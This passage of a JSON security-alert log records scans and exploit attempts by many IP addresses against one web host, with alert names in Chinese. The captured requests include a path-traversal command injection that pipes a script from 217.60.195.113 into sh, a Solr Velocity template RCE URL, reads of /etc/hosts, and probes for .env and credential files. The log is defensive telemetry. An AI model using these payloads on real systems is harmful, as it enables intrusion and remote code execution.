YTTvMwSOGtJ8aTdeG9OKsBqgOebcyNH13MFasPWsPahp6jIWwPHJO1ZkNy8Zlc3QZbYh7pJLqosM7CRVcneHy65ZkzY96ighlNlP79Cq3oeOr8qVmQJDBLSBQQwFR25oUAxMAwuyrGOdYjOg509IygLo1StlSlAlk9odcapmDNU50TITTu7ANEErxUSeJYCuSezfK4snxFeN2aELfCtJhd5mxheBBDnssS4R5zQxZOUUWbDOrJW2iAohub1jp2mG0mwuS8tUD4t8rgAvsyVV45GSDWhKn3TuhVlZj0qc0O1NYIDPPWVujb3UsL2B1jMS3em1wGSxd1unFVo3MMYO8OzHRAwkSwCTYBoMxy7uJwBL8euCiebWXFaaHce6euA54cRgu9uwNnUSemwk5XhiW1l84H8hAW1rLFU6eFV5JWJ9o9dCrRR1eNWAS64Ga5aRbmNbjBnT0XBy67UArfnm0VGTEqqnXt47hN1baask8l8ckeO4x9qk5dl7qEy9USNO5ikSjZvNOQPRflDp31NcVWZWhgKzWTUMWyPDgfZuPj9NKQO6g6WqgnKKQ70SjdVgk5MlDJ1t30H3dOaGqkmSVIge2GknFZdFYMBCR8sGEanf850i9eUHVu6ONoJmw60WvLnudrOozieJfLsBoeoiUIl3UFNa0e0htTNcuvAl0LKTIrCoi3ChDGO6e1zCLxKJI8bvnHfLujIwGgqbwYAnHYeUlIdQbFBZNxhawBuIwV7RDEjBVm4GGzoVU7SPCnDvlrgpJzktAYmf4kGDpiaP6h7MgqMPrQQXFS6blQiTjiiDTSmDwWnY422RMp9GG9N2G1GkUOxBlwZAuXqyg9V1XWeZq0MeB1uu2zw4NYHUPnrqqAHVV0js2YKohrp6cGDN0t7TdqE32Xxmy23d67DiMt4BFCdg3iiboZGnvh97gyGc2g0OAGhUIpbknP1McnpLuJ8qDAmHSAIi8yEB3lqzHaxBd7rNIacoBozNkqpJy5cU04ysQcNJQstmEi02kZ9OENzk2kzNl6eHaRaWIgQ78p5Gua0Z8bcOtfPUPgmJTmu2ZzvdXFxJxcbo7VAugJBxgxV1SH2mm5bIDts6aOVMCEYAWmw0iLxhX8aiLTN1qZlLGo27PPJ5fynNIZc2DMW98VSgSobAgyCqgT59MnWUVIyUXNTJldpJXejf9OQV7htSNC3PixI6XDlOnnznxhDW0k58ff8H32AtyMLUA2tL1XLR1OfwoEaSKJSCBLt7zLjvogRVAQzqvUJWmxXt7Yj4DjMMGImZl878dHaYqV0Ezgoy1YarDGDrcxPp5zxXG7wcDKpbLNER\r\n",
+            "response_headers": "HTTP/1.1 301 Moved Permanently\r\nDate: Mon, 22 Jun 2026 03:05:43 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nLocation: https://121.248.57.234:443/\r\nServer: <OMITTED>\r\n"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:172.232.232.10",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 4,
+      "raw_alert_count": 13,
+      "first_seen": "2026-06-20T18:40:52Z",
+      "last_seen": "2026-06-20T18:41:16Z",
+      "occurrence_count": 13,
+      "occurrence_pattern": "burst",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1781980852-7xiEs",
+          "evidence_ids": [
+            "/sdk",
+            "schemas.xmlsoap.org",
+            "w3.org",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML"
+          ],
+          "ts": "2026-06-20T18:40:52Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "Vmware Vcenter缓冲区溢出漏洞(CVE-2024-38812)",
+            "protocol": "HTTP",
+            "src_port": 45982,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "漏洞攻击|开源和商业应用漏洞|开源和商业应用漏洞",
+            "threat_category": "exploit",
+            "request_headers": "POST /sdk HTTP/1.1\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nHost: <OMITTED>\r\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML\r\n",
+            "response_headers": "HTTP/1.1 301 Moved Permanently\r\nDate: Sat, 20 Jun 2026 18:40:52 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nLocation: https://121.248.57.234:443/sdk\r\nServer: <OMITTED>\r\n",
+            "request_body": "<soap:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Header><operationID>00000001-00000001</operationID></soap:Header><soap:Body><RetrieveServiceContent xmlns=\"urn:internalvim25\"><_this xsi:type=\"ManagedObjectReference\" type=\"ServiceInstance\">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>"
+          }
+        },
+        {
+          "alert_vid": "43881263|network_security_log-1781980853-XBHnm",
+          "evidence_ids": [
+            "/CFIDE/componentutils/",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML"
+          ],
+          "ts": "2026-06-20T18:40:53Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "fail",
+            "alert_name": "Allaire ColdFusion服务器敏感目录访问",
+            "protocol": "HTTP",
+            "src_port": 46084,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|信息泄露|Web目录泄露",
+            "threat_category": "unknown",
+            "request_headers": "GET /CFIDE/componentutils/ HTTP/1.1\r\nConnection: <OMITTED>\r\nHost: <OMITTED>\r\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML\r\n",
+            "response_headers": "HTTP/1.1 301 Moved Permanently\r\nDate: Sat, 20 Jun 2026 18:40:53 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nLocation: https://121.248.57.234:443/CFIDE/componentutils/\r\nServer: <OMITTED>\r\n"
+          }
+        },
+        {
+          "alert_vid": "43881263|network_security_log-1781980876-Coxsp",
+          "evidence_ids": [
+            "/admin.shtml",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML",
+            "/admin.php",
+            "/admin.jsp",
+            "/admin/config.php",
+            "/admin.html",
+            "/admin.aspx",
+            "/admin.cfm",
+            "/admin.asp",
+            "/admin.cgi"
+          ],
+          "ts": "2026-06-20T18:41:16Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "fail",
+            "alert_name": "服务器敏感文件访问",
+            "protocol": "HTTP",
+            "src_port": 36948,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|信息泄露|系统信息泄露",
+            "threat_category": "unknown"
+          },
+          "count": 9,
+          "foldedStatement": "[2026-06-20T18:41:03Z~2026-06-20T18:41:16Z] 172.232.232.10 对 121.248.57.234:80 触发同类告警 90:7:1，聚合告警数：9，结果：failure",
+          "folded_alert_vids": [
+            "43881263|network_security_log-1781980863-fTC8U",
+            "43881263|network_security_log-1781980865-w37Iy",
+            "43881263|network_security_log-1781980866-w37Ip",
+            "43881263|network_security_log-1781980866-w37Ii",
+            "43881263|network_security_log-1781980873-w37Os",
+            "43881263|network_security_log-1781980874-w37On",
+            "43881263|network_security_log-1781980874-w37Ob",
+            "43881263|network_security_log-1781980874-w37Om",
+            "43881263|network_security_log-1781980876-Coxsp"
+          ]
+        },
+        {
+          "alert_vid": "43881263|network_security_log-1781980872-RGG8B",
+          "evidence_ids": [
+            "/sms_mp/.sms_aut?mplist",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML",
+            "/metasys/com/jci/metasys/MetasysProperties.properties",
+            "MetasysProperties.properties"
+          ],
+          "ts": "2026-06-20T18:41:12Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "通用信息泄露攻击",
+            "protocol": "HTTP",
+            "src_port": 36644,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|信息泄露|系统信息泄露",
+            "threat_category": "unknown"
+          },
+          "count": 2,
+          "foldedStatement": "[2026-06-20T18:41:11Z~2026-06-20T18:41:12Z] 172.232.232.10 对 121.248.57.234:80 触发同类告警 90:7:1，聚合告警数：2，结果：attempt",
+          "folded_alert_vids": [
+            "43881263|network_security_log-1781980871-xoG8Y",
+            "43881263|network_security_log-1781980872-RGG8B"
+          ]
+        }
+      ]
+    },
+    {
+      "src": "ip:121.194.14.147",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 1,
+      "first_seen": "2026-06-22T02:45:16Z",
+      "last_seen": "2026-06-22T02:45:16Z",
+      "occurrence_count": 1,
+      "occurrence_pattern": "one_shot",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782096316-UrhzL",
+          "evidence_ids": [
+            "/_t3082/5486/list686.psp",
+            "news.seu.edu.cn",
+            "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
+          ],
+          "ts": "2026-06-22T02:45:16Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "爬虫BaiduSpider扫描",
+            "protocol": "HTTP",
+            "src_port": 26212,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "黑客工具|爬虫工具|爬虫工具",
+            "threat_category": "unknown",
+            "request_headers": "GET /_t3082/5486/list686.psp HTTP/1.1\r\nHost: <OMITTED>\r\nUser-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\r\nAccept-Language: <OMITTED>\r\nAccept: <OMITTED>\r\nAccept-Encoding: <OMITTED>\r\nCookie: 091d98c8-d622-41d1-8be5-7df8ca478039=315ede42b454331d14c7a82f6016f514\r\nX-Forwarded-For: 220.181.108.111\r\n",
+            "response_headers": "HTTP/1.1 301 Moved Permanently\r\nDate: Mon, 22 Jun 2026 02:45:15 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nLocation: https://news.seu.edu.cn:443/_t3082/5486/list686.psp\r\nServer: <OMITTED>\r\n"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:185.91.69.33",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 3,
+      "first_seen": "2026-06-22T05:05:11Z",
+      "last_seen": "2026-06-22T05:05:11Z",
+      "occurrence_count": 3,
+      "occurrence_pattern": "burst",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782104711-ExMNW",
+          "evidence_ids": [
+            "/",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
+            "15rXw4tETAWdzZsVribK5i3V1jWsp1VciU",
+            "0xbeab272484799d0fb46b762c92bc6fc1d0e553da",
+            "/api/v1/version",
+            "user"
+          ],
+          "ts": "2026-06-22T05:05:11Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "fail",
+            "alert_name": "Web弱口令",
+            "protocol": "HTTP",
+            "src_port": 45036,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "脆弱性风险|弱口令|Web弱口令",
+            "threat_category": "abuse"
+          },
+          "count": 3,
+          "foldedStatement": "[2026-06-22T05:04:37Z~2026-06-22T05:05:11Z] 185.91.69.33 对 121.248.57.234:80 触发同类告警 94:4:7，聚合告警数：3，结果：failure",
+          "folded_alert_vids": [
+            "43881263|network_security_log-1782104677-ExMNL",
+            "43881263|network_security_log-1782104679-ShKCM",
+            "43881263|network_security_log-1782104711-ExMNW"
+          ]
+        }
+      ]
+    },
+    {
+      "src": "ip:182.190.217.8",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 1,
+      "first_seen": "2026-06-21T21:04:28Z",
+      "last_seen": "2026-06-21T21:04:28Z",
+      "occurrence_count": 1,
+      "occurrence_pattern": "one_shot",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782075868-TyzM5",
+          "evidence_ids": [
+            "/boaform/admin/formLogin?username=admin&psd=admin",
+            "admin"
+          ],
+          "ts": "2026-06-21T21:04:28Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "fail",
+            "alert_name": "Web弱口令",
+            "protocol": "HTTP",
+            "src_port": 12352,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "脆弱性风险|弱口令|Web弱口令",
+            "threat_category": "abuse",
+            "request_headers": "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0\r\n",
+            "response_headers": "HTTP/1.1 301 Moved Permanently\r\nDate: Sun, 21 Jun 2026 21:04:28 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nLocation: https://:443/boaform/admin/formLogin?username=admin&psd=admin\r\nServer: <OMITTED>\r\n"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:165.245.200.192",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 1,
+      "first_seen": "2026-06-21T16:34:05Z",
+      "last_seen": "2026-06-21T16:34:05Z",
+      "occurrence_count": 1,
+      "occurrence_pattern": "one_shot",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782059645-hmm3A",
+          "evidence_ids": [
+            "/_profiler/phpinfo",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+          ],
+          "ts": "2026-06-21T16:34:05Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "通用信息泄露攻击",
+            "protocol": "HTTP",
+            "src_port": 42330,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|信息泄露|系统信息泄露",
+            "threat_category": "unknown",
+            "request_headers": "GET /_profiler/phpinfo HTTP/1.1\r\nHost: <OMITTED>\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nAccept-Encoding: <OMITTED>\r\n",
+            "response_headers": "HTTP/1.1 301 Moved Permanently\r\nDate: Sun, 21 Jun 2026 16:34:04 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nLocation: https://121.248.57.234:443/_profiler/phpinfo\r\nServer: <OMITTED>\r\n"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:45.148.10.200",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 2,
+      "raw_alert_count": 8,
+      "first_seen": "2026-06-21T19:37:40Z",
+      "last_seen": "2026-06-22T01:35:03Z",
+      "occurrence_count": 8,
+      "occurrence_pattern": "sporadic",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782070660-sDdVf",
+          "evidence_ids": [
+            "/.env.example",
+            "l9explore/1.2.2",
+            "/.git/config",
+            "/.env.bak",
+            "/www/.env"
+          ],
+          "ts": "2026-06-21T19:37:40Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "通用信息泄露攻击",
+            "protocol": "HTTP",
+            "src_port": 58574,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|信息泄露|系统信息泄露",
+            "threat_category": "unknown"
+          },
+          "count": 4,
+          "foldedStatement": "[2026-06-21T19:37:39Z~2026-06-21T19:37:40Z] 45.148.10.200 对 121.248.57.234:80 触发同类告警 90:7:1，聚合告警数：4，结果：attempt",
+          "folded_alert_vids": [
+            "43881263|network_security_log-1782070659-NOdVa",
+            "43881263|network_security_log-1782070659-pJdVr",
+            "43881263|network_security_log-1782070660-aAdVc",
+            "43881263|network_security_log-1782070660-sDdVf"
+          ]
+        },
+        {
+          "alert_vid": "43881263|network_security_log-1782092103-JHnn9",
+          "evidence_ids": [
+            "/html/.env",
+            "l9explore/1.2.2",
+            "/.envrc.local",
+            "/.env.stage",
+            "/.env.development"
+          ],
+          "ts": "2026-06-22T01:35:03Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "通用信息泄露攻击",
+            "protocol": "HTTP",
+            "src_port": 47160,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|信息泄露|系统信息泄露",
+            "threat_category": "unknown"
+          },
+          "count": 4,
+          "foldedStatement": "[2026-06-22T01:35:02Z~2026-06-22T01:35:03Z] 45.148.10.200 对 121.248.57.234:80 触发同类告警 90:7:1，聚合告警数：4，结果：attempt",
+          "folded_alert_vids": [
+            "43881263|network_security_log-1782092102-Wsnbk",
+            "43881263|network_security_log-1782092102-oTnvA",
+            "43881263|network_security_log-1782092103-cVnmt",
+            "43881263|network_security_log-1782092103-JHnn9"
+          ]
+        }
+      ]
+    },
+    {
+      "src": "ip:143.244.144.237",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 1,
+      "first_seen": "2026-06-21T05:35:06Z",
+      "last_seen": "2026-06-21T05:35:06Z",
+      "occurrence_count": 1,
+      "occurrence_pattern": "one_shot",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782020106-eQE5p",
+          "evidence_ids": [
+            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+            "libredtail-http"
+          ],
+          "ts": "2026-06-21T05:35:06Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "目录遍历攻击,通用系统命令注入攻击",
+            "protocol": "HTTP",
+            "src_port": 42922,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|代码注入|系统命令注入",
+            "threat_category": "exploit",
+            "request_headers": "POST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1\r\nHost: <OMITTED>\r\nUpgrade-Insecure-Requests: <OMITTED>\r\nAccept: <OMITTED>\r\nUser-Agent: libredtail-http\r\nConnection: <OMITTED>\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\n",
+            "request_body": "(wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s apache.selfrep"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:80.87.206.229",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 5,
+      "raw_alert_count": 26,
+      "first_seen": "2026-06-21T05:30:57Z",
+      "last_seen": "2026-06-21T05:31:28Z",
+      "occurrence_count": 26,
+      "occurrence_pattern": "burst",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782019857-RlrDb",
+          "evidence_ids": [
+            "/.DS_Store",
+            "Go-http-client/1.1"
+          ],
+          "ts": "2026-06-21T05:30:57Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "通用信息泄露攻击,DS_Store 信息泄露,MacOS X客户端Apache敏感文件访问",
+            "protocol": "HTTP",
+            "src_port": 51442,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|信息泄露|配置文件泄露",
+            "threat_category": "unknown",
+            "request_headers": "GET /.DS_Store HTTP/1.1\r\nHost: <OMITTED>\r\nUser-Agent: Go-http-client/1.1\r\nAccept-Encoding: <OMITTED>\r\nConnection: <OMITTED>\r\n",
+            "response_headers": "HTTP/1.1 301 Moved Permanently\r\nDate: Sun, 21 Jun 2026 05:30:57 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nLocation: https://121.248.57.234:443/.DS_Store\r\nServer: <OMITTED>\r\n"
+          }
+        },
+        {
+          "alert_vid": "43881263|network_security_log-1782019888-gtcvj",
+          "evidence_ids": [
+            "/@fs/etc/passwd?import&raw??",
+            "l9explore/1.2.2",
+            "/.json",
+            "/server.py",
+            "/.env.save",
+            "env.save",
+            "/.git/config",
+            "/.claude/settings.json",
+            "/.env.example",
+            "/.claude/claude.json",
+            "/.vscode/sftp.json",
+            "/config.json",
+            "/docker-compose.override.yml",
+            "/docker-compose.yml",
+            "/.env.production",
+            "/.secret",
+            "/phpinfo.php",
+            "/.env",
+            "/.env.backup",
+            "/.env?import&raw??",
+            "/.clauderc",
+            "/.env.old",
+            "/.env.local",
+            "/.config"
+          ],
+          "ts": "2026-06-21T05:31:28Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "通用信息泄露攻击",
+            "protocol": "HTTP",
+            "src_port": 47912,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|信息泄露|系统信息泄露",
+            "threat_category": "unknown"
+          },
+          "count": 22,
+          "foldedStatement": "[2026-06-21T05:30:58Z~2026-06-21T05:31:28Z] 80.87.206.229 对 121.248.57.234:80 触发同类告警 90:7:1，聚合告警数：22，结果：attempt",
+          "folded_alert_vids": [
+            "43881263|network_security_log-1782019858-Uyh7Z",
+            "43881263|network_security_log-1782019858-yGh7U",
+            "43881263|network_security_log-1782019860-Qch09",
+            "43881263|network_security_log-1782019863-HUhwB",
+            "43881263|network_security_log-1782019864-mqccP",
+            "43881263|network_security_log-1782019864-QghtW",
+            "43881263|network_security_log-1782019865-Jihi9",
+            "43881263|network_security_log-1782019866-cUccF",
+            "43881263|network_security_log-1782019870-PaccZ",
+            "43881263|network_security_log-1782019871-DSccV",
+            "43881263|network_security_log-1782019872-kuccN",
+            "43881263|network_security_log-1782019872-RnhcY",
+            "43881263|network_security_log-1782019873-kAccM",
+            "43881263|network_security_log-1782019873-cmcv2",
+            "43881263|network_security_log-1782019875-GMcv4",
+            "43881263|network_security_log-1782019876-Rlcv6",
+            "43881263|network_security_log-1782019877-mGhQj",
+            "43881263|network_security_log-1782019879-qyhTz",
+            "43881263|network_security_log-1782019884-ZGhPM",
+            "43881263|network_security_log-1782019886-aLhGI",
+            "43881263|network_security_log-1782019887-pMhH2",
+            "43881263|network_security_log-1782019888-gtcvj"
+          ]
+        },
+        {
+          "alert_vid": "43881263|network_security_log-1782019871-CTt9n",
+          "evidence_ids": [
+            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts",
+            "Lkx-Apache2449TraversalPlugin/0.0.1 (+https://leakix.net/, +https://twitter.com/HaboubiAnis)"
+          ],
+          "ts": "2026-06-21T05:31:11Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "服务器敏感文件访问,目录遍历攻击,通用目录遍历攻击",
+            "protocol": "HTTP",
+            "src_port": 51432,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|目录遍历|目录遍历",
+            "threat_category": "exploit",
+            "request_headers": "GET /cgi-bin/../../../../../../../../../etc/hosts HTTP/1.1\r\nHost: <OMITTED>\r\nUser-Agent: Lkx-Apache2449TraversalPlugin/0.0.1 (+https://leakix.net/, +https://twitter.com/HaboubiAnis)\r\nAccept-Encoding: <OMITTED>\r\nConnection: <OMITTED>\r\n"
+          }
+        },
+        {
+          "alert_vid": "43881263|network_security_log-1782019877-dp7Fy",
+          "evidence_ids": [
+            "/api/geojson?url=file:///etc/hosts",
+            "l9explore/1.2.2"
+          ],
+          "ts": "2026-06-21T05:31:17Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "Metabase 任意文件读取漏洞(CVE-2021-41277),通用信息泄露攻击,服务器敏感文件访问",
+            "protocol": "HTTP",
+            "src_port": 43548,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "漏洞攻击|开源和商业应用漏洞|开源和商业应用漏洞",
+            "threat_category": "exploit",
+            "request_headers": "GET /api/geojson?url=file:///etc/hosts HTTP/1.1\r\nHost: <OMITTED>\r\nUser-Agent: l9explore/1.2.2\r\nAccept-Encoding: <OMITTED>\r\nConnection: <OMITTED>\r\n"
+          }
+        },
+        {
+          "alert_vid": "43881263|network_security_log-1782019878-8qwFi",
+          "evidence_ids": [
+            "/s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties",
+            "pom.properties",
+            "l9explore/1.2.2"
+          ],
+          "ts": "2026-06-21T05:31:18Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "Atlassian Jira/Confluence 文件读取漏洞(CVE-2021-26086/CVE-2021-26085),通用信息泄露攻击,Atlassian Jira信息泄漏漏洞(CVE-2020-29453)",
+            "protocol": "HTTP",
+            "src_port": 47778,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "漏洞攻击|开源和商业应用漏洞|开源和商业应用漏洞",
+            "threat_category": "exploit",
+            "request_headers": "GET /s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1\r\nHost: <OMITTED>\r\nUser-Agent: l9explore/1.2.2\r\nAccept-Encoding: <OMITTED>\r\nConnection: <OMITTED>\r\n",
+            "response_headers": "HTTP/1.1 301 Moved Permanently\r\nDate: Sun, 21 Jun 2026 05:31:18 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nLocation: https://121.248.57.234:443/s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties\r\nServer: <OMITTED>\r\n"
+          }
+        }
+      ]
+    }
+  ],
+  "evidences": [
+    {
+      "evidence_id": "/api/v1/version",
+      "type": "URL",
+      "entity_value": "/api/v1/version"
+    },
+    {
+      "evidence_id": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
+      "type": "FINGERPRINT",
+      "entity_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+    },
+    {
+      "evidence_id": "user",
+      "type": "CREDENTIAL",
+      "entity_value": "user"
+    },
+    {
+      "evidence_id": "/",
+      "type": "URL",
+      "entity_value": "/"
+    },
+    {
+      "evidence_id": "0xbeab272484799d0fb46b762c92bc6fc1d0e553da",
+      "type": "CREDENTIAL",
+      "entity_value": "0xbeab272484799d0fb46b762c92bc6fc1d0e553da"
+    },
+    {
+      "evidence_id": "15rXw4tETAWdzZsVribK5i3V1jWsp1VciU",
+      "type": "CREDENTIAL",
+      "entity_value": "15rXw4tETAWdzZsVribK5i3V1jWsp1VciU"
+    },
+    {
+      "evidence_id": "0x6d5cc0183db850a099ec64e70ff4672035d0397a",
+      "type": "CREDENTIAL",
+      "entity_value": "0x6d5cc0183db850a099ec64e70ff4672035d0397a"
+    },
+    {
+      "evidence_id": "/api/solr/%7B%7Bcore%7D%7D/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+%5B1..$out.available()%5D)$str.valueOf($chr.toChars($out.read()))%23end",
+      "type": "URL",
+      "entity_value": "/api/solr/%7B%7Bcore%7D%7D/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+%5B1..$out.available()%5D)$str.valueOf($chr.toChars($out.read()))%23end"
+    },
+    {
+      "evidence_id": "out.read",
+      "type": "DOMAIN",
+      "entity_value": "out.read"
+    },
+    {
+      "evidence_id": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
+      "type": "FINGERPRINT",
+      "entity_value": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
+    },
+    {
+      "evidence_id": "1HNLK6GFGBeCqnCrUY97rgmVbmiQxRX6kZ",
+      "type": "CREDENTIAL",
+      "entity_value": "1HNLK6GFGBeCqnCrUY97rgmVbmiQxRX6kZ"
+    },
+    {
+      "evidence_id": "/_t3082/5486/list686.psp",
+      "type": "URL",
+      "entity_value": "/_t3082/5486/list686.psp"
+    },
+    {
+      "evidence_id": "news.seu.edu.cn",
+      "type": "DOMAIN",
+      "entity_value": "news.seu.edu.cn"
+    },
+    {
+      "evidence_id": "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+      "type": "FINGERPRINT",
+      "entity_value": "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
+    },
+    {
